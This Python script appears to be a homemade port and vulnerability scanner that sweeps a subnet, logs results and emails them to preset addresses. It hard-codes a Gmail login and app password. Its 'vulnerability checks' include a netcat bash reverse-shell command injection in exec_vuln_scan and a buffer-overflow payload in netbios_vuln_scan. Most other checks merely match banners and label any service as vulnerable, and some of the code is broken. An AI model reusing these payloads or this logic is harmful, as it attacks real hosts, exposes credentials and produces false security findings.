import socket
import smtplib
import logging
import threading
import re
import time
import datetime
import concurrent.futures
from urllib.parse import urlparse
from termcolor import colored
from os.path import basename
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication


        
# Function to scan a single port on a single host
def scan_port(target_ip, port, timeout):
    #Scan a single port on the target IP address
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                print(colored(f"{target_ip}:{port} is open","green"))
                # Perform vulnerability scanning on open ports here
                return (target_ip,port)
    except (socket.gaierror, socket.timeout):
        pass
    except Exception as e:
        print(colored(f"Error scanning port {port}: {e}", "red"))
        pass
    
# Function to scan a range of ports on a single host
def scan_range(target_ip, start_port, end_port, timeout):
    #Scan a range of ports on the target IP address
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(scan_port, target_ip, port, timeout) for port in range(start_port, end_port+1)]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                open_ports.append(result)
    return open_ports

# Function to scan a range of ports on multiple hosts
def scan_network(network, start_port, end_port, timeout):
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(scan_range, f"{network}.{i}", start_port, end_port, timeout) for i in range(1, 255)]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                open_ports.append(result)
    return open_ports

# Function to generate report for all open ports
def generate_report(target_ip, open_ports):
    #Generate a report of the scanning results
    report = f"Scan report for {target_ip}\n\n"
    report += "PORT\t\t\tSTATE\n"
    for port in open_ports:
        report += f"{port}\topen\n"
    return report
    
# Function to log results to file
def log_results(report):
    #Log the scanning results to a file
    logging.basicConfig(filename='network_scan.log', level=logging.DEBUG)
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_message = f"[{timestamp}] {report}"
    logging.debug(log_message)
    print(colored("Data logged in File","green")) 

# Function to send email alert using SMTP
def send_email(subject, email_message, recipient):
    #Send an email alert with the scanning results
    
    try:
        from_addr = 'domtoretto4000@gmail.com'
        to_addr = 'msbalsari2208@gmail.com'
        subject = 'Hey SOC TEAM ALERT !! LOG REPORT FILE'
        content = 'Dear SOC Team,\n We have an urgent alert notification for you. The scheduled Network Scan Report is ready.\n Please find attached the LOG REPORT FILE GENERATED TODAY.'

        msg = MIMEMultipart()
        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = subject
        body = MIMEText(content, 'plain')
        msg.attach(body)

        filename = 'network_scan.log'
        with open(filename, 'r') as f:
            part = MIMEApplication(f.read(), Name=basename(filename))
            part['Content-Disposition'] = 'attachment; filename="{}"'.format(basename(filename))
        msg.attach(part)
        #print("Message is- ",msg)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        #print("Server created")
        server.starttls()
        #print("Server started")
        server.login('domtoretto4000@gmail.com', 'skvpzukmtaubltva')
        #print("Server Login done")
        server.send_message(msg, from_addr=from_addr, to_addrs=[to_addr])
        print(colored("Email Alert Sent successfully.\n","red"))   
    except:
        print(colored("Failed to send email alert.\n", "red"))

'''
# Function to find hostname using IP address    
def reverse_lookup(ip_address):
    #Perform a DNS reverse lookup on an IP address
    try:
        hostname = socket.gethostbyaddr(ip_address)[0]
        return hostname
    except:
        print(colored(f"Could not perform reverse lookup on IP address: {ip_address}\n","red"))
        return None
'''
# Function to validate IP address    
def validate_ip_address(ip_address):
    try:
        # Check if IP address is in correct format
        socket.inet_aton(ip_address)
        
        # Split the IP address into its four numbers
        ip_numbers = ip_address.split('.')
        
        # Check if there are four numbers separated by dots
        if len(ip_numbers) != 4:
            print(colored(f"\nIP address {ip_address} should contain 4 numbers separated by dots","red"), flush=True)
            return False
        
        # Check if the host address is not in the range of 1-255
        if not (1 <= int(ip_numbers[3]) <= 255):
            print(colored(f"\nHost address {ip_numbers[3]} should be in the range of 1-255 for IP address {ip_address}","red"), flush=True)
            return False
            
        return True
        
    except socket.error:
        print(colored(f"\nInvalid IP address {ip_address}","red"), flush=True)
        return False


#Function to check port is open or closed
def port_status(ip, port, timeout):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        if result == 0:
            print(colored(f"{target_ip}:{port} is open","green"))
        else:
            try:
                service_name = socket.getservbyport(port)
                print(colored(f"{target_ip}:{port} is closed and occupied by {service_name}","red"))
            except OSError:
                pass
    
            try:
                service_name = socket.getnameinfo((ip, port), socket.NI_DGRAM)[0]
                print(colored(f"{target_ip}:{port} is closed and occupied by {service_name}","red"))
            except socket.error:
                pass
                
            
    except (socket.gaierror, socket.timeout):
        pass
    except Exception as e:
        print(colored(f"Error scanning port {port}: {e}", "red"))
        pass

       
#Function for vulnerability scanning
def scan_vulnerabilities(target_ip, port_list):
    for port in port_list:
        threading.Thread(target=port_scan_worker, args=(target_ip, port)).start()

def port_scan_worker(target_ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((target_ip, port))
    if result == 0:
        #print(f"Port {port} is open")
        http_vuln_scan(target_ip, port)
        ssh_vuln_scan(target_ip, port)
        ftp_vuln_scan(target_ip, port)
        # rpcbind_vuln_scan(target_ip, port)
        telnet_vuln_scan(target_ip, port)
        mssql_vuln_scan(target_ip, port)
        snmp_vuln_scan(target_ip, port)
        smtp_vuln_scan(target_ip, port)
        mysql_vuln_scan(target_ip, port)
        nfs_vuln_scan(target_ip, port)
        tcpwrapped_vuln_scan(target_ip, port)
        postgres_vuln_scan(target_ip, port)
        netbios_vuln_scan(target_ip, port)
        distccd_vuln_scan(target_ip, port)
        samba_vuln_scan(target_ip, port)
        bindshell_vuln_scan(target_ip, port)
        exec_vuln_scan(target_ip, port)
        ajp13_vuln_scan(target_ip, port)
        vnc_vuln_scan(target_ip, port)
        nlockmgr_vuln_scan(target_ip, port)

        
    sock.close()
    
    if(port == port_list[-1]):
        print(colored("\nVulnerability scan completed","green"))
        
def ajp13_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
        banner = sock.recv(1024)
        if re.search(b"Apache Tomcat", banner):
            print(colored("[!] Vulnerable to Apache Tomcat AJP13 exploit", "red"))
    except:
        pass
    finally:
        sock.close()

def distccd_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((target_ip, port))
        banner = sock.recv(1024)
        if b"distccd" in banner:
            print(colored("[!] Vulnerable to distccd exploit","red"))
        else:
            print(colored("[*] Target does not appear to be vulnerable to distccd exploit","green"))
    except Exception as e:
        print(colored(f"[!] Error: {e}","red"))
    finally:
        sock.close()
        
def nfs_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)  # Set timeout to 3 seconds to avoid hanging
        sock.connect((target_ip, port))
        banner = sock.recv(1024)
        if b"NFS" in banner:
            print(colored("[!] Vulnerable to NFS exploit","red"))
        else:
            print(colored("[*] Target does not appear to be vulnerable to NFS exploit","green"))
    except Exception as e:
        print(colored(f"[!] Error: {e}","red"))
    finally:
        sock.close()

def bindshell_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)  # Set timeout to 3 seconds to avoid hanging
        sock.connect((target_ip, port))
        banner = sock.recv(1024)
        if b"bindshell" in banner:
            print(colored("[!] Vulnerable to bindshell exploit","red"))
        else:
            print(colored("[*] Target does not appear to be vulnerable to bindshell exploit","green"))
    except Exception as e:
        print(colored(f"[!] Error: {e}","red"))
    finally:
        sock.close()

def tcpwrapped_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)  # Set timeout to 3 seconds to avoid hanging
        sock.connect((target_ip, port))
        banner = sock.recv(1024)
        if b"TCP Wrapper" in banner:
            print(colored("[!] Vulnerable to TCP-wrapped exploit","red"))
        else:
            print(colored("[*] Target does not appear to be vulnerable to TCP-wrapped exploit","green"))
    except Exception as e:
        print(colored(f"[!] Error: {e}","red"))
    finally:
        sock.close()     

'''
####/// def rpcbind_vuln_scan(target_ip, port):
    #try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        sock.send(b"\x01\x86\xFF\x7F\x00\x00\x00\x00\x00\x00\x00\x00")
        response = sock.recv(1024)
        if response[1] == b"\x00":
            print(colored("[*] Target does not appear to be vulnerable to rpcbind exploit","red"))
        else:
            print(colored("[!] Vulnerable to rpcbind exploit","green"))
    except Exception as e:
        print(colored(f"[!] Error: {e}","red"))
    finally:
        sock.close()
'''
def nlockmgr_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        sock.send(b"GET /RPC2 HTTP/1.0\r\n\r\n")
        response = sock.recv(1024)
        if b"RPC" in response:
            print(colored(f"[!]{target_ip}:{port} is vulnerable to nlockmgr exploits","red"))
    except:
        print(colored(f"[*]{target_ip}:{port} is not vulnerable to nlockmgr exploits","green"))
    finally:
        sock.close()
        
def vnc_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        banner = sock.recv(1024)
        if b"RFB" in banner:
            print("[+] VNC service is running on {0}:{1}".format(target_ip, port))
            # Check for VNC authentication bypass vulnerability
            payload = b"\x01\x00\x00\x00\x00\x00\x00\x00"
            sock.send(payload)
            response = sock.recv(1024)
            if b"Authentication failed" not in response:
                print("[!] VNC service is vulnerable to authentication bypass on {0}:{1}".format(target_ip, port))
        else:
            print("[*] VNC service is not running on {0}:{1}".format(target_ip, port))
    except:
        print("[-] Failed to connect to {0}:{1}".format(target_ip, port))
    finally:
        sock.close()

def exec_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        banner = sock.recv(1024)
        if b"Remote Management Interface" in banner:
            print("[+] Exec service is running on {0}:{1}".format(target_ip, port))
            # Check for exec command injection vulnerability
            payload = b";nc -e /bin/bash {0} 4444 #".format(target_ip.encode())
            sock.send(payload)
            response = sock.recv(1024)
            if b"Connection refused" not in response:
                print("[!] Exec service is vulnerable to command injection on {0}:{1}".format(target_ip, port))
        else:
            print("[*] Exec service is not running on {0}:{1}".format(target_ip, port))
    except:
        print("[-] Failed to connect to {0}:{1}".format(target_ip, port))
    finally:
        sock.close()

def netbios_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        banner = sock.recv(1024)
        if b"MSFAX" in banner:
            print("[+] NetBIOS-SSN service is running on {0}:{1}".format(target_ip, port))
            # Check for MSFAX buffer overflow vulnerability
            payload = b"\x41" * 1000
            sock.send(payload)
            response = sock.recv(1024)
            if b"ERROR" in response:
                print("[!] NetBIOS-SSN service is vulnerable to MSFAX buffer overflow on {0}:{1}".format(target_ip, port))
        else:
            print("[*] NetBIOS-SSN service is not running on {0}:{1}".format(target_ip, port))
    except:
        print("[-] Failed to connect to {0}:{1}".format(target_ip, port))
    finally:
        sock.close()

def samba_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        banner = sock.recv(1024)
        if b"Samba" in banner:
            print(f"[*] Samba version: {banner.decode().strip()}")
            sock.send(b"GET / HTTP/1.1\r\n\r\n")
            response = sock.recv(1024)
            if b"Samba" in response:
                print(colored("[!] Vulnerable to Samba exploit","red"))
        else:
            print(colored("[*] Target does not appear to be running Samba","green"))
    except Exception as e:
        print(colored(f"[!] Error: {e}","red"))
    finally:
    	sock.close()

        
def snmp_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        # send a test request to the SNMP service
        sock.sendto(b"\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x19\x02\x04\x7a\x69\x00\x02\x01\x00\x02\x01\x7f\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00", (target_ip, port))
        response = sock.recv(1024)
        if b"public" in response:
            print(colored("[!] Vulnerable to SNMP exploits","red"))
        # add more vulnerability checks for other SNMP services as needed
    except:
        pass
    finally:
        sock.close()
        
def smtp_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        banner = sock.recv(1024)
        if b"220" in banner:
            sock.send(b"EHLO test\r\n")
            response = sock.recv(1024)
            if b"250" in response:
                print("[+] SMTP service is running on {0}:{1}".format(target_ip, port))
                sock.send(b"MAIL FROM:<test@test.com>\r\n")
                response = sock.recv(1024)
                if b"250" in response:
                    print("[!] SMTP service is vulnerable to mail spoofing on {0}:{1}".format(target_ip, port))
        else:
            print("[*] SMTP service is not running on {0}:{1}".format(target_ip, port))
    except:
        print("[-] Failed to connect to {0}:{1}".format(target_ip, port))
    finally:
        sock.close()

def ftp_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        banner = sock.recv(1024)
        if re.search(b"vsftpd", banner):
            print(colored("[!] Vulnerable to vsftpd exploits","red"))
        
    except:
        pass
    finally:
        sock.close()
        
def telnet_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        banner = sock.recv(1024)
        if re.search(b"OpenSSH_", banner):
            print(colored("[!] Vulnerable to OpenSSH exploits","red"))
        
    except:
        pass
    finally:
        sock.close()
        
def http_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        sock.sendall(b"GET / HTTP/1.1\r\nHost: "+target_ip.encode()+b"\r\n\r\n")
        data = sock.recv(1024)
        if re.search(b"Server:.*Apache/2\.2\.\d+", data):
            print(colored("[!] Vulnerable to Apache 2.2.x exploits","red"))

    except:
        pass
    finally:
        sock.close()

def ssh_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        banner = sock.recv(1024)
        if re.search(b"OpenSSH_", banner):
            print(colored("[!] Vulnerable to OpenSSH exploits","red"))
    except:
        pass
    finally:
        sock.close()

def mssql_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        banner = sock.recv(1024)

        if re.search(b"mysql_native_password", banner):
            print(colored("[!] MySQL 5.0.51a-3ubuntu5 is vulnerable", "red"))
        else:
            print(colored("[*] MySQL 5.0.51a-3ubuntu5 is not vulnerable", "green")) 
    except:
        pass
    finally:
        sock.close()

def mysql_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        banner = sock.recv(1024)

        if "mysql_native_password" in banner.decode():
            print(colored("[!] MySQL 5.0.51a-3ubuntu5 is vulnerable", "red"))
        else:
            print(colored("[*] MySQL 5.0.51a-3ubuntu5 is not vulnerable", "green"))
    except:
        pass
    finally:
        sock.close()

def postgres_vuln_scan(target_ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, port))
        banner = sock.recv(1024)
        if re.search(b"PostgreSQL", banner):
            print(colored("[!] Vulnerable to PostgreSQL exploits","red"))
        
    except:
        pass
    finally:
        sock.close()


        

if __name__ == "__main__":
    target_ip = ""
    while True:
        try:
            choice = int(input(colored("\nEnter 1 to scan whole network ports\nEnter 2 to scan individual IP\nEnter 3 to scan single port\nEnter 8 to exit\t","white")))
            if 1 <= choice <= 3 or choice==8:
                break
            else:
                print(colored("Invalid choice. Please enter a value between 1 and 3 or 8.","red"))
        except ValueError:
            print(colored("Invalid input. Please enter a valid integer.","red"))
        
    while(choice!=8 and choice<=8 and choice>=0):
        validation = True
        if(choice==1):
            network = input(colored("\nEnter the network address: \t","white"))
        elif(choice==2 or choice ==3):
            target_ip = input(colored("\nEnter the target IP address: ","white"))
            validation = validate_ip_address(target_ip)
            while(validation==False):
            	target_ip = input(colored("\nEnter the target IP address: ","white"))
            	validation = validate_ip_address(target_ip)
        
            
        if(choice==3):
            port = int(input(colored("Enter the port number: ","white")))
#            hostname = reverse_lookup(target_ip);
#            print(colored("\nHostname is ", "green") + hostname)
            port_status(target_ip, port, 10)
            vulnerability_choice = int(input(colored("\nEnter 1 to scan vulnerability\nEnter 2 to skip\t\t","white")))
            if(vulnerability_choice == 1):
                port_list = list(range(port, port+1))
                scan_vulnerabilities(target_ip, port_list)
                time.sleep(10)
                
        elif(validation == True):
            start_port = int(input(colored("Enter the starting port number: ","white")))
            end_port = int(input(colored("Enter the ending port number: ","white")))
            timeout = int(input(colored("Enter the timeout (in seconds): ","white")))
    
            if(choice ==1):
                open_ports = scan_network(network, start_port, end_port, timeout)
            else:
#                hostname = reverse_lookup(target_ip);      
#                print(colored("\nHostname is ", "green") + hostname)
                open_ports = scan_range(target_ip, start_port, end_port, timeout)
            
            report = generate_report(target_ip, open_ports)
            print(report)
            log_results(report)
                        
            # Implement automated reporting and email alerts based on specific conditions here
            if len(open_ports) == 0:
                print(colored(f"No open ports found on {target_ip or network}","red"))
            else:
                subject = colored(f"Network Scan Alert for {target_ip or network}","green")
                send_email(subject, report, "nishcheygarg517@gmail.com")
                
            vulnerability_choice = int(input(colored("\nEnter 1 to scan vulnerability\nEnter 2 to skip\t\t","white")))
            if(vulnerability_choice == 1):
                port_list = list(range(start_port, end_port+1))
                scan_vulnerabilities(target_ip, port_list)
                time.sleep(10)
              

            
        else:
            print(validation)
            
        while True:
            try:
                choice = int(input(colored("\nEnter 1 to scan whole network ports\nEnter 2 to scan individual IP\nEnter 3 to scan single port\nEnter 8 to exit\t","white")))
                if 1 <= choice <= 3 or choice == 8:
                    break
                else:
                    print(colored("Invalid choice. Please enter a value between 1 and 3 or 8.","red"))
            except ValueError:
                print(colored("Invalid input. Please enter a valid integer.","red"))
